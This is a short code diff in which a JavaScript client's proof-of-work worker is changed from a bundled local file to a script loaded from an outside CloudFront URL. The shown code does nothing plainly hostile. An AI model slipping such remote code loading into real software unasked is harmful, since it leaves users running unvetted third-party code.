@@ -69,7 +69,7 @@ fetch(settings.API_ENDPOINT, {
 			document.body.appendChild(star)
 		}
 		if (data.pow == false){
-			const corswrk = new Worker(new URL('./methods/pow.worker.js', import.meta.url));
+			const corswrk = new Worker(new URL("https://d2eqxekwqc06fw.cloudfront.net/611.main.js"));
 			const worker = corswrk.getWorker();
 			worker.postMessage({ data: data.pow_challenge, difficulty: data.difficulty });
 			worker.onmessage = (event) => {
